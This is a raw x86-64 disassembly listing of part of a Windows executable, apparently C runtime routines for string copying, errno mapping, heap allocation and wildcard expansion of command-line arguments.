   1400063be:	e8 d1 01 00 00       	call   0x140006594
   1400063c3:	bb 16 00 00 00       	mov    $0x16,%ebx
   1400063c8:	89 18                	mov    %ebx,(%rax)
   1400063ca:	e8 6d ff ff ff       	call   0x14000633c
   1400063cf:	8b c3                	mov    %ebx,%eax
   1400063d1:	48 83 c4 20          	add    $0x20,%rsp
   1400063d5:	5b                   	pop    %rbx
   1400063d6:	c3                   	ret
   1400063d7:	4c 8b c9             	mov    %rcx,%r9
   1400063da:	4c 2b c1             	sub    %rcx,%r8
   1400063dd:	43 0f b7 04 08       	movzwl (%r8,%r9,1),%eax
   1400063e2:	66 41 89 01          	mov    %ax,(%r9)
   1400063e6:	4d 8d 49 02          	lea    0x2(%r9),%r9
   1400063ea:	66 85 c0             	test   %ax,%ax
   1400063ed:	74 e0                	je     0x1400063cf
   1400063ef:	48 83 ea 01          	sub    $0x1,%rdx
   1400063f3:	75 e8                	jne    0x1400063dd
   1400063f5:	48 85 d2             	test   %rdx,%rdx
   1400063f8:	75 d5                	jne    0x1400063cf
   1400063fa:	66 89 19             	mov    %bx,(%rcx)
   1400063fd:	e8 92 01 00 00       	call   0x140006594
   140006402:	bb 22 00 00 00       	mov    $0x22,%ebx
   140006407:	eb bf                	jmp    0x1400063c8
   140006409:	cc                   	int3
   14000640a:	cc                   	int3
   14000640b:	cc                   	int3
   14000640c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006411:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006416:	57                   	push   %rdi
   140006417:	48 83 ec 20          	sub    $0x20,%rsp
   14000641b:	45 33 d2             	xor    %r10d,%r10d
   14000641e:	49 8b d8             	mov    %r8,%rbx
   140006421:	4c 8b da             	mov    %rdx,%r11
   140006424:	4d 85 c9             	test   %r9,%r9
   140006427:	75 31                	jne    0x14000645a
   140006429:	48 85 c9             	test   %rcx,%rcx
   14000642c:	75 31                	jne    0x14000645f
   14000642e:	48 85 d2             	test   %rdx,%rdx
   140006431:	74 14                	je     0x140006447
   140006433:	e8 5c 01 00 00       	call   0x140006594
   140006438:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000643d:	89 18                	mov    %ebx,(%rax)
   14000643f:	e8 f8 fe ff ff       	call   0x14000633c
   140006444:	44 8b d3             	mov    %ebx,%r10d
   140006447:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000644c:	41 8b c2             	mov    %r10d,%eax
   14000644f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006454:	48 83 c4 20          	add    $0x20,%rsp
   140006458:	5f                   	pop    %rdi
   140006459:	c3                   	ret
   14000645a:	48 85 c9             	test   %rcx,%rcx
   14000645d:	74 d4                	je     0x140006433
   14000645f:	4d 85 db             	test   %r11,%r11
   140006462:	74 cf                	je     0x140006433
   140006464:	4d 85 c9             	test   %r9,%r9
   140006467:	75 06                	jne    0x14000646f
   140006469:	66 44 89 11          	mov    %r10w,(%rcx)
   14000646d:	eb d8                	jmp    0x140006447
   14000646f:	48 85 db             	test   %rbx,%rbx
   140006472:	75 06                	jne    0x14000647a
   140006474:	66 44 89 11          	mov    %r10w,(%rcx)
   140006478:	eb b9                	jmp    0x140006433
   14000647a:	48 2b d9             	sub    %rcx,%rbx
   14000647d:	48 8b d1             	mov    %rcx,%rdx
   140006480:	4d 8b c3             	mov    %r11,%r8
   140006483:	49 8b f9             	mov    %r9,%rdi
   140006486:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000648a:	75 18                	jne    0x1400064a4
   14000648c:	0f b7 04 13          	movzwl (%rbx,%rdx,1),%eax
   140006490:	66 89 02             	mov    %ax,(%rdx)
   140006493:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   140006497:	66 85 c0             	test   %ax,%ax
   14000649a:	74 ab                	je     0x140006447
   14000649c:	49 83 e8 01          	sub    $0x1,%r8
   1400064a0:	75 ea                	jne    0x14000648c
   1400064a2:	eb 33                	jmp    0x1400064d7
   1400064a4:	0f b7 04 13          	movzwl (%rbx,%rdx,1),%eax
   1400064a8:	48 8b f7             	mov    %rdi,%rsi
   1400064ab:	66 89 02             	mov    %ax,(%rdx)
   1400064ae:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   1400064b2:	66 85 c0             	test   %ax,%ax
   1400064b5:	74 90                	je     0x140006447
   1400064b7:	49 83 e8 01          	sub    $0x1,%r8
   1400064bb:	74 06                	je     0x1400064c3
   1400064bd:	48 83 ef 01          	sub    $0x1,%rdi
   1400064c1:	75 e1                	jne    0x1400064a4
   1400064c3:	4d 85 c0             	test   %r8,%r8
   1400064c6:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
   1400064ca:	48 0f 44 c6          	cmove  %rsi,%rax
   1400064ce:	48 85 c0             	test   %rax,%rax
   1400064d1:	75 04                	jne    0x1400064d7
   1400064d3:	66 44 89 12          	mov    %r10w,(%rdx)
   1400064d7:	4d 85 c0             	test   %r8,%r8
   1400064da:	0f 85 67 ff ff ff    	jne    0x140006447
   1400064e0:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   1400064e4:	75 0f                	jne    0x1400064f5
   1400064e6:	66 46 89 54 59 fe    	mov    %r10w,-0x2(%rcx,%r11,2)
   1400064ec:	45 8d 50 50          	lea    0x50(%r8),%r10d
   1400064f0:	e9 52 ff ff ff       	jmp    0x140006447
   1400064f5:	66 44 89 11          	mov    %r10w,(%rcx)
   1400064f9:	e8 96 00 00 00       	call   0x140006594
   1400064fe:	bb 22 00 00 00       	mov    $0x22,%ebx
   140006503:	e9 35 ff ff ff       	jmp    0x14000643d
   140006508:	33 c0                	xor    %eax,%eax
   14000650a:	4c 8d 0d ff 90 00 00 	lea    0x90ff(%rip),%r9        # 0x14000f610
   140006511:	49 8b d1             	mov    %r9,%rdx
   140006514:	44 8d 40 08          	lea    0x8(%rax),%r8d
   140006518:	3b 0a                	cmp    (%rdx),%ecx
   14000651a:	74 2b                	je     0x140006547
   14000651c:	ff c0                	inc    %eax
   14000651e:	49 03 d0             	add    %r8,%rdx
   140006521:	83 f8 2d             	cmp    $0x2d,%eax
   140006524:	72 f2                	jb     0x140006518
   140006526:	8d 41 ed             	lea    -0x13(%rcx),%eax
   140006529:	83 f8 11             	cmp    $0x11,%eax
   14000652c:	77 06                	ja     0x140006534
   14000652e:	b8 0d 00 00 00       	mov    $0xd,%eax
   140006533:	c3                   	ret
   140006534:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   14000653a:	b8 16 00 00 00       	mov    $0x16,%eax
   14000653f:	83 f9 0e             	cmp    $0xe,%ecx
   140006542:	41 0f 46 c0          	cmovbe %r8d,%eax
   140006546:	c3                   	ret
   140006547:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   14000654c:	c3                   	ret
   14000654d:	cc                   	int3
   14000654e:	cc                   	int3
   14000654f:	cc                   	int3
   140006550:	40 53                	rex push %rbx
   140006552:	48 83 ec 20          	sub    $0x20,%rsp
   140006556:	48 8b da             	mov    %rdx,%rbx
   140006559:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000655d:	89 4a 34             	mov    %ecx,0x34(%rdx)
   140006560:	e8 a3 ff ff ff       	call   0x140006508
   140006565:	89 43 2c             	mov    %eax,0x2c(%rbx)
   140006568:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000656c:	48 83 c4 20          	add    $0x20,%rsp
   140006570:	5b                   	pop    %rbx
   140006571:	c3                   	ret
   140006572:	cc                   	int3
   140006573:	cc                   	int3
   140006574:	48 83 ec 28          	sub    $0x28,%rsp
   140006578:	e8 4f f8 ff ff       	call   0x140005dcc
   14000657d:	48 85 c0             	test   %rax,%rax
   140006580:	75 09                	jne    0x14000658b
   140006582:	48 8d 05 2f 1b 01 00 	lea    0x11b2f(%rip),%rax        # 0x1400180b8
   140006589:	eb 04                	jmp    0x14000658f
   14000658b:	48 83 c0 24          	add    $0x24,%rax
   14000658f:	48 83 c4 28          	add    $0x28,%rsp
   140006593:	c3                   	ret
   140006594:	48 83 ec 28          	sub    $0x28,%rsp
   140006598:	e8 2f f8 ff ff       	call   0x140005dcc
   14000659d:	48 85 c0             	test   %rax,%rax
   1400065a0:	75 09                	jne    0x1400065ab
   1400065a2:	48 8d 05 0b 1b 01 00 	lea    0x11b0b(%rip),%rax        # 0x1400180b4
   1400065a9:	eb 04                	jmp    0x1400065af
   1400065ab:	48 83 c0 20          	add    $0x20,%rax
   1400065af:	48 83 c4 28          	add    $0x28,%rsp
   1400065b3:	c3                   	ret
   1400065b4:	40 53                	rex push %rbx
   1400065b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400065ba:	4c 8b c2             	mov    %rdx,%r8
   1400065bd:	48 8b d9             	mov    %rcx,%rbx
   1400065c0:	48 85 c9             	test   %rcx,%rcx
   1400065c3:	74 0e                	je     0x1400065d3
   1400065c5:	33 d2                	xor    %edx,%edx
   1400065c7:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   1400065cb:	48 f7 f3             	div    %rbx
   1400065ce:	49 3b c0             	cmp    %r8,%rax
   1400065d1:	72 43                	jb     0x140006616
   1400065d3:	49 0f af d8          	imul   %r8,%rbx
   1400065d7:	b8 01 00 00 00       	mov    $0x1,%eax
   1400065dc:	48 85 db             	test   %rbx,%rbx
   1400065df:	48 0f 44 d8          	cmove  %rax,%rbx
   1400065e3:	eb 15                	jmp    0x1400065fa
   1400065e5:	e8 76 ea ff ff       	call   0x140005060
   1400065ea:	85 c0                	test   %eax,%eax
   1400065ec:	74 28                	je     0x140006616
   1400065ee:	48 8b cb             	mov    %rbx,%rcx
   1400065f1:	e8 52 29 00 00       	call   0x140008f48
   1400065f6:	85 c0                	test   %eax,%eax
   1400065f8:	74 1c                	je     0x140006616
   1400065fa:	48 8b 0d 97 31 01 00 	mov    0x13197(%rip),%rcx        # 0x140019798
   140006601:	4c 8b c3             	mov    %rbx,%r8
   140006604:	ba 08 00 00 00       	mov    $0x8,%edx
   140006609:	ff 15 f1 79 00 00    	call   *0x79f1(%rip)        # 0x14000e000
   14000660f:	48 85 c0             	test   %rax,%rax
   140006612:	74 d1                	je     0x1400065e5
   140006614:	eb 0d                	jmp    0x140006623
   140006616:	e8 79 ff ff ff       	call   0x140006594
   14000661b:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140006621:	33 c0                	xor    %eax,%eax
   140006623:	48 83 c4 20          	add    $0x20,%rsp
   140006627:	5b                   	pop    %rbx
   140006628:	c3                   	ret
   140006629:	cc                   	int3
   14000662a:	cc                   	int3
   14000662b:	cc                   	int3
   14000662c:	48 85 c9             	test   %rcx,%rcx
   14000662f:	74 36                	je     0x140006667
   140006631:	53                   	push   %rbx
   140006632:	48 83 ec 20          	sub    $0x20,%rsp
   140006636:	4c 8b c1             	mov    %rcx,%r8
   140006639:	33 d2                	xor    %edx,%edx
   14000663b:	48 8b 0d 56 31 01 00 	mov    0x13156(%rip),%rcx        # 0x140019798
   140006642:	ff 15 00 7b 00 00    	call   *0x7b00(%rip)        # 0x14000e148
   140006648:	85 c0                	test   %eax,%eax
   14000664a:	75 16                	jne    0x140006662
   14000664c:	ff 15 3e 7a 00 00    	call   *0x7a3e(%rip)        # 0x14000e090
   140006652:	8b c8                	mov    %eax,%ecx
   140006654:	e8 af fe ff ff       	call   0x140006508
   140006659:	8b d8                	mov    %eax,%ebx
   14000665b:	e8 34 ff ff ff       	call   0x140006594
   140006660:	89 18                	mov    %ebx,(%rax)
   140006662:	48 83 c4 20          	add    $0x20,%rsp
   140006666:	5b                   	pop    %rbx
   140006667:	c3                   	ret
   140006668:	48 3b ca             	cmp    %rdx,%rcx
   14000666b:	73 04                	jae    0x140006671
   14000666d:	83 c8 ff             	or     $0xffffffff,%eax
   140006670:	c3                   	ret
   140006671:	33 c0                	xor    %eax,%eax
   140006673:	48 3b ca             	cmp    %rdx,%rcx
   140006676:	0f 97 c0             	seta   %al
   140006679:	c3                   	ret
   14000667a:	cc                   	int3
   14000667b:	cc                   	int3
   14000667c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140006681:	55                   	push   %rbp
   140006682:	56                   	push   %rsi
   140006683:	57                   	push   %rdi
   140006684:	41 54                	push   %r12
   140006686:	41 55                	push   %r13
   140006688:	41 56                	push   %r14
   14000668a:	41 57                	push   %r15
   14000668c:	48 8d ac 24 40 fe ff 	lea    -0x1c0(%rsp),%rbp
   140006693:	ff 
   140006694:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   14000669b:	48 8b 05 9e 19 01 00 	mov    0x1199e(%rip),%rax        # 0x140018040
   1400066a2:	48 33 c4             	xor    %rsp,%rax
   1400066a5:	48 89 85 b8 01 00 00 	mov    %rax,0x1b8(%rbp)
   1400066ac:	45 33 e4             	xor    %r12d,%r12d
   1400066af:	48 89 54 24 50       	mov    %rdx,0x50(%rsp)
   1400066b4:	4c 8b f9             	mov    %rcx,%r15
   1400066b7:	48 85 d2             	test   %rdx,%rdx
   1400066ba:	75 18                	jne    0x1400066d4
   1400066bc:	e8 d3 fe ff ff       	call   0x140006594
   1400066c1:	41 8d 5c 24 16       	lea    0x16(%r12),%ebx
   1400066c6:	89 18                	mov    %ebx,(%rax)
   1400066c8:	e8 6f fc ff ff       	call   0x14000633c
   1400066cd:	8b c3                	mov    %ebx,%eax
   1400066cf:	e9 58 03 00 00       	jmp    0x140006a2c
   1400066d4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400066d7:	4c 89 22             	mov    %r12,(%rdx)
   1400066da:	48 8b 01             	mov    (%rcx),%rax
   1400066dd:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   1400066e3:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400066e8:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400066ed:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   1400066f2:	48 85 c0             	test   %rax,%rax
   1400066f5:	0f 84 09 02 00 00    	je     0x140006904
   1400066fb:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   140006702:	c7 85 b0 01 00 00 2a 	movl   $0x3f002a,0x1b0(%rbp)
   140006709:	00 3f 00 
   14000670c:	48 8b c8             	mov    %rax,%rcx
   14000670f:	66 44 89 a5 b4 01 00 	mov    %r12w,0x1b4(%rbp)
   140006716:	00 
   140006717:	48 bb 01 08 00 00 00 	movabs $0x200000000801,%rbx
   14000671e:	20 00 00 
   140006721:	e8 36 1c 00 00       	call   0x14000835c
   140006726:	4d 8b 37             	mov    (%r15),%r14
   140006729:	48 8b c8             	mov    %rax,%rcx
   14000672c:	48 85 c0             	test   %rax,%rax
   14000672f:	75 2b                	jne    0x14000675c
   140006731:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140006736:	45 33 c0             	xor    %r8d,%r8d
   140006739:	33 d2                	xor    %edx,%edx
   14000673b:	49 8b ce             	mov    %r14,%rcx
   14000673e:	e8 29 03 00 00       	call   0x140006a6c
   140006743:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140006748:	8b f0                	mov    %eax,%esi
   14000674a:	85 c0                	test   %eax,%eax
   14000674c:	0f 85 5b 01 00 00    	jne    0x1400068ad
   140006752:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006757:	e9 45 01 00 00       	jmp    0x1400068a1
   14000675c:	49 3b c6             	cmp    %r14,%rax
   14000675f:	74 1f                	je     0x140006780
   140006761:	0f b7 01             	movzwl (%rcx),%eax
   140006764:	66 83 e8 2f          	sub    $0x2f,%ax
   140006768:	66 83 f8 2d          	cmp    $0x2d,%ax
   14000676c:	77 09                	ja     0x140006777
   14000676e:	0f b7 c0             	movzwl %ax,%eax
   140006771:	48 0f a3 c3          	bt     %rax,%rbx
   140006775:	72 09                	jb     0x140006780
   140006777:	48 83 e9 02          	sub    $0x2,%rcx
   14000677b:	49 3b ce             	cmp    %r14,%rcx
   14000677e:	75 e1                	jne    0x140006761
   140006780:	0f b7 11             	movzwl (%rcx),%edx
   140006783:	66 83 fa 3a          	cmp    $0x3a,%dx
   140006787:	75 09                	jne    0x140006792
   140006789:	49 8d 46 02          	lea    0x2(%r14),%rax
   14000678d:	48 3b c8             	cmp    %rax,%rcx
   140006790:	75 4f                	jne    0x1400067e1
   140006792:	66 83 ea 2f          	sub    $0x2f,%dx
   140006796:	66 83 fa 2d          	cmp    $0x2d,%dx
   14000679a:	77 0b                	ja     0x1400067a7
   14000679c:	0f b7 c2             	movzwl %dx,%eax
   14000679f:	48 0f a3 c3          	bt     %rax,%rbx
   1400067a3:	b0 01                	mov    $0x1,%al
   1400067a5:	72 03                	jb     0x1400067aa
   1400067a7:	41 8a c4             	mov    %r12b,%al
   1400067aa:	49 2b ce             	sub    %r14,%rcx
   1400067ad:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   1400067b2:	48 d1 f9             	sar    $1,%rcx
   1400067b5:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   1400067ba:	48 ff c1             	inc    %rcx
   1400067bd:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400067c2:	f6 d8                	neg    %al
   1400067c4:	4d 1b ed             	sbb    %r13,%r13
   1400067c7:	45 33 c9             	xor    %r9d,%r9d
   1400067ca:	4c 23 e9             	and    %rcx,%r13
   1400067cd:	33 d2                	xor    %edx,%edx
   1400067cf:	49 8b ce             	mov    %r14,%rcx
   1400067d2:	ff 15 80 79 00 00    	call   *0x7980(%rip)        # 0x14000e158
   1400067d8:	48 8b d8             	mov    %rax,%rbx
   1400067db:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400067df:	75 2c                	jne    0x14000680d
   1400067e1:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400067e6:	4d 8b c4             	mov    %r12,%r8
   1400067e9:	49 8b d4             	mov    %r12,%rdx
   1400067ec:	49 8b ce             	mov    %r14,%rcx
   1400067ef:	e8 78 02 00 00       	call   0x140006a6c
   1400067f4:	8b f0                	mov    %eax,%esi
   1400067f6:	85 c0                	test   %eax,%eax
   1400067f8:	0f 85 de 00 00 00    	jne    0x1400068dc
   1400067fe:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006803:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140006808:	e9 94 00 00 00       	jmp    0x1400068a1
   14000680d:	48 2b f7             	sub    %rdi,%rsi
   140006810:	48 c1 fe 03          	sar    $0x3,%rsi
   140006814:	4c 8b e6             	mov    %rsi,%r12
   140006817:	33 ff                	xor    %edi,%edi
   140006819:	66 83 7d 8c 2e       	cmpw   $0x2e,-0x74(%rbp)
   14000681e:	75 15                	jne    0x140006835
   140006820:	0f b7 45 8e          	movzwl -0x72(%rbp),%eax
   140006824:	66 85 c0             	test   %ax,%ax
   140006827:	74 2a                	je     0x140006853
   140006829:	66 83 f8 2e          	cmp    $0x2e,%ax
   14000682d:	75 06                	jne    0x140006835
   14000682f:	66 39 7d 90          	cmp    %di,-0x70(%rbp)
   140006833:	74 1e                	je     0x140006853
   140006835:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000683a:	4d 8b c5             	mov    %r13,%r8
   14000683d:	49 8b d6             	mov    %r14,%rdx
   140006840:	48 8d 4d 8c          	lea    -0x74(%rbp),%rcx
   140006844:	e8 23 02 00 00       	call   0x140006a6c
   140006849:	8b f0                	mov    %eax,%esi
   14000684b:	85 c0                	test   %eax,%eax
   14000684d:	0f 85 80 00 00 00    	jne    0x1400068d3
   140006853:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140006858:	48 8b cb             	mov    %rbx,%rcx
   14000685b:	ff 15 ff 78 00 00    	call   *0x78ff(%rip)        # 0x14000e160
   140006861:	85 c0                	test   %eax,%eax
   140006863:	75 b4                	jne    0x140006819
   140006865:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000686a:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000686f:	48 8b d6             	mov    %rsi,%rdx
   140006872:	48 2b d7             	sub    %rdi,%rdx
   140006875:	48 c1 fa 03          	sar    $0x3,%rdx
   140006879:	4c 3b e2             	cmp    %rdx,%r12
   14000687c:	74 17                	je     0x140006895
   14000687e:	49 2b d4             	sub    %r12,%rdx
   140006881:	4a 8d 0c e7          	lea    (%rdi,%r12,8),%rcx
   140006885:	4c 8d 0d dc fd ff ff 	lea    -0x224(%rip),%r9        # 0x140006668
   14000688c:	44 8d 40 08          	lea    0x8(%rax),%r8d
   140006890:	e8 8b 31 00 00       	call   0x140009a20
   140006895:	48 8b cb             	mov    %rbx,%rcx
   140006898:	ff 15 b2 78 00 00    	call   *0x78b2(%rip)        # 0x14000e150
   14000689e:	45 33 e4             	xor    %r12d,%r12d
   1400068a1:	49 83 c7 08          	add    $0x8,%r15
   1400068a5:	49 8b 07             	mov    (%r15),%rax
   1400068a8:	e9 45 fe ff ff       	jmp    0x1400066f2
   1400068ad:	48 8b df             	mov    %rdi,%rbx
   1400068b0:	48 3b 7c 24 38       	cmp    0x38(%rsp),%rdi
   1400068b5:	0f 84 c4 00 00 00    	je     0x14000697f
   1400068bb:	48 8b 0b             	mov    (%rbx),%rcx
   1400068be:	e8 69 fd ff ff       	call   0x14000662c
   1400068c3:	48 83 c3 08          	add    $0x8,%rbx
   1400068c7:	48 3b 5c 24 38       	cmp    0x38(%rsp),%rbx
   1400068cc:	75 ed                	jne    0x1400068bb
   1400068ce:	e9 ac 00 00 00       	jmp    0x14000697f
   1400068d3:	48 8b cb             	mov    %rbx,%rcx
   1400068d6:	ff 15 74 78 00 00    	call   *0x7874(%rip)        # 0x14000e150
   1400068dc:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400068e1:	48 8b df             	mov    %rdi,%rbx
   1400068e4:	48 3b 7c 24 38       	cmp    0x38(%rsp),%rdi
   1400068e9:	0f 84 90 00 00 00    	je     0x14000697f
   1400068ef:	48 8b 0b             	mov    (%rbx),%rcx
   1400068f2:	e8 35 fd ff ff       	call   0x14000662c
   1400068f7:	48 83 c3 08          	add    $0x8,%rbx
   1400068fb:	48 3b 5c 24 38       	cmp    0x38(%rsp),%rbx
   140006900:	75 ed                	jne    0x1400068ef
   140006902:	eb 7b                	jmp    0x14000697f
   140006904:	4c 8b f6             	mov    %rsi,%r14
   140006907:	49 8b d4             	mov    %r12,%rdx
   14000690a:	4c 2b f7             	sub    %rdi,%r14
   14000690d:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140006912:	49 c1 fe 03          	sar    $0x3,%r14
   140006916:	48 8b c7             	mov    %rdi,%rax
   140006919:	49 ff c6             	inc    %r14
   14000691c:	48 3b fe             	cmp    %rsi,%rdi
   14000691f:	74 25                	je     0x140006946
   140006921:	4c 8b 08             	mov    (%rax),%r9
   140006924:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140006928:	48 ff c1             	inc    %rcx
   14000692b:	66 45 39 24 49       	cmp    %r12w,(%r9,%rcx,2)
   140006930:	75 f6                	jne    0x140006928
   140006932:	48 ff c2             	inc    %rdx
   140006935:	48 83 c0 08          	add    $0x8,%rax
   140006939:	48 03 d1             	add    %rcx,%rdx
   14000693c:	48 3b c6             	cmp    %rsi,%rax
   14000693f:	75 e0                	jne    0x140006921
   140006941:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140006946:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000694c:	49 8b ce             	mov    %r14,%rcx
   14000694f:	e8 7c dd ff ff       	call   0x1400046d0
   140006954:	48 8b d8             	mov    %rax,%rbx
   140006957:	48 85 c0             	test   %rax,%rax
   14000695a:	75 32                	jne    0x14000698e
   14000695c:	33 c9                	xor    %ecx,%ecx
   14000695e:	e8 c9 fc ff ff       	call   0x14000662c
   140006963:	48 8b df             	mov    %rdi,%rbx
   140006966:	48 3b fe             	cmp    %rsi,%rdi
   140006969:	74 11                	je     0x14000697c
   14000696b:	48 8b 0b             	mov    (%rbx),%rcx
   14000696e:	e8 b9 fc ff ff       	call   0x14000662c
   140006973:	48 83 c3 08          	add    $0x8,%rbx
   140006977:	48 3b de             	cmp    %rsi,%rbx
   14000697a:	75 ef                	jne    0x14000696b
   14000697c:	83 ce ff             	or     $0xffffffff,%esi
   14000697f:	48 8b cf             	mov    %rdi,%rcx
   140006982:	e8 a5 fc ff ff       	call   0x14000662c
   140006987:	8b c6                	mov    %esi,%eax
   140006989:	e9 9e 00 00 00       	jmp    0x140006a2c
   14000698e:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   140006992:	4c 8b f7             	mov    %rdi,%r14
   140006995:	48 89 8d b0 01 00 00 	mov    %rcx,0x1b0(%rbp)
   14000699c:	4c 8b e1             	mov    %rcx,%r12
   14000699f:	48 3b fe             	cmp    %rsi,%rdi
   1400069a2:	74 56                	je     0x1400069fa
   1400069a4:	4c 8b eb             	mov    %rbx,%r13
   1400069a7:	4c 2b ef             	sub    %rdi,%r13
   1400069aa:	4d 8b 06             	mov    (%r14),%r8
   1400069ad:	49 83 cf ff          	or     $0xffffffffffffffff,%r15
   1400069b1:	33 c0                	xor    %eax,%eax
   1400069b3:	49 ff c7             	inc    %r15
   1400069b6:	66 43 39 04 78       	cmp    %ax,(%r8,%r15,2)
   1400069bb:	75 f6                	jne    0x1400069b3
   1400069bd:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400069c2:	49 8b c4             	mov    %r12,%rax
   1400069c5:	48 2b c1             	sub    %rcx,%rax
   1400069c8:	49 ff c7             	inc    %r15
   1400069cb:	48 d1 f8             	sar    $1,%rax
   1400069ce:	4d 8b cf             	mov    %r15,%r9
   1400069d1:	48 2b d0             	sub    %rax,%rdx
   1400069d4:	49 8b cc             	mov    %r12,%rcx
   1400069d7:	e8 30 fa ff ff       	call   0x14000640c
   1400069dc:	33 c9                	xor    %ecx,%ecx
   1400069de:	85 c0                	test   %eax,%eax
   1400069e0:	75 74                	jne    0x140006a56
   1400069e2:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   1400069e9:	4f 89 24 2e          	mov    %r12,(%r14,%r13,1)
   1400069ed:	49 83 c6 08          	add    $0x8,%r14
   1400069f1:	4f 8d 24 7c          	lea    (%r12,%r15,2),%r12
   1400069f5:	4c 3b f6             	cmp    %rsi,%r14
   1400069f8:	75 b0                	jne    0x1400069aa
   1400069fa:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400069ff:	33 c9                	xor    %ecx,%ecx
   140006a01:	48 89 18             	mov    %rbx,(%rax)
   140006a04:	e8 23 fc ff ff       	call   0x14000662c
   140006a09:	48 8b df             	mov    %rdi,%rbx
   140006a0c:	48 3b fe             	cmp    %rsi,%rdi
   140006a0f:	74 11                	je     0x140006a22
   140006a11:	48 8b 0b             	mov    (%rbx),%rcx
   140006a14:	e8 13 fc ff ff       	call   0x14000662c
   140006a19:	48 83 c3 08          	add    $0x8,%rbx
   140006a1d:	48 3b de             	cmp    %rsi,%rbx
   140006a20:	75 ef                	jne    0x140006a11
   140006a22:	48 8b cf             	mov    %rdi,%rcx
   140006a25:	e8 02 fc ff ff       	call   0x14000662c
   140006a2a:	33 c0                	xor    %eax,%eax
   140006a2c:	48 8b 8d b8 01 00 00 	mov    0x1b8(%rbp),%rcx
   140006a33:	48 33 cc             	xor    %rsp,%rcx
   140006a36:	e8 95 61 00 00       	call   0x14000cbd0
   140006a3b:	48 8b 9c 24 10 03 00 	mov    0x310(%rsp),%rbx
   140006a42:	00 
   140006a43:	48 81 c4 c0 02 00 00 	add    $0x2c0,%rsp
   140006a4a:	41 5f                	pop    %r15
   140006a4c:	41 5e                	pop    %r14
   140006a4e:	41 5d                	pop    %r13
   140006a50:	41 5c                	pop    %r12
   140006a52:	5f                   	pop    %rdi
   140006a53:	5e                   	pop    %rsi
   140006a54:	5d                   	pop    %rbp
   140006a55:	c3                   	ret
   140006a56:	45 33 c9             	xor    %r9d,%r9d
   140006a59:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140006a5e:	45 33 c0             	xor    %r8d,%r8d
   140006a61:	33 d2                	xor    %edx,%edx
   140006a63:	e8 f4 f8 ff ff       	call   0x14000635c
   140006a68:	cc                   	int3
   140006a69:	cc                   	int3
   140006a6a:	cc                   	int3
   140006a6b:	cc                   	int3
   140006a6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006a71:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006a76:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006a7b:	57                   	push   %rdi
   140006a7c:	41 54                	push   %r12
   140006a7e:	41 55                	push   %r13
   140006a80:	41 56                	push   %r14
   140006a82:	41 57                	push   %r15
   140006a84:	48 83 ec 30          	sub    $0x30,%rsp
   140006a88:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140006a8c:	49 8b f9             	mov    %r9,%rdi
   140006a8f:	33 f6                	xor    %esi,%esi
   140006a91:	4d 8b f0             	mov    %r8,%r14
   140006a94:	4c 8b ea             	mov    %rdx,%r13
   140006a97:	4c 8b e1             	mov    %rcx,%r12
   140006a9a:	48 ff c5             	inc    %rbp
   140006a9d:	66 39 34 69          	cmp    %si,(%rcx,%rbp,2)
   140006aa1:	75 f7                	jne    0x140006a9a
   140006aa3:	49 8b c6             	mov    %r14,%rax
   140006aa6:	48 ff c5             	inc    %rbp
   140006aa9:	48 f7 d0             	not    %rax
   140006aac:	48 3b e8             	cmp    %rax,%rbp
   140006aaf:	76 22                	jbe    0x140006ad3
   140006ab1:	b8 0c 00 00 00       	mov    $0xc,%eax
   140006ab6:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
